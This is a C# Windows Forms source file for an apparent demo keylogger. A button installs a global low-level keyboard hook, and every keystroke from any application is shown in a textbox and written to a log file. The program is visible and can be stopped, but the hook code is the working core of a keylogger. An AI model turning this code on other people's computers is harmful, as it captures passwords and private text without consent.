using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using KeyboardLogger.WindowsApi;
using KeyboardLogger.KeyLog;

namespace KeyboardLogger
{
    public partial class MainWin : Form
    {
        // data
        IntPtr hHook = IntPtr.Zero;
        LowLevelKeyboardProc kydbHookProc;
        Log userLog = new Log("wolfram77");
        static Log headLog = new Log("head");


        // constructor
        public MainWin()
        {
            InitializeComponent();
        }


        // log button handler
        private void button_Log_Click(object sender, EventArgs e)
        {
            if (hHook.ToInt32() != 0)
            {
                User32.UnhookWindowsHookEx(hHook);
                button_Log.Text = "Log";
                hHook = IntPtr.Zero;
                return;
            }
            kydbHookProc = new LowLevelKeyboardProc(KbdHook);
            ProcessModule module = Process.GetCurrentProcess().MainModule;
            IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
            hHook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, kydbHookProc, hMod, 0);
            button_Log.Text = "Stop Log";
            textBox_Log.Text = "";
        }


        // keyboard hook procedure
        IntPtr KbdHook(int code, WM wParam, [In]KBDLLHOOKSTRUCT lParam)
        {
            if (code >= 0)
            {
                Keys key = (Keys)lParam.vkCode;
                string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP)? key + "- " : key + " ";
                textBox_Log.Text = textBox_Log.Text + txt;
                userLog.Write(txt);
            }
            return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}
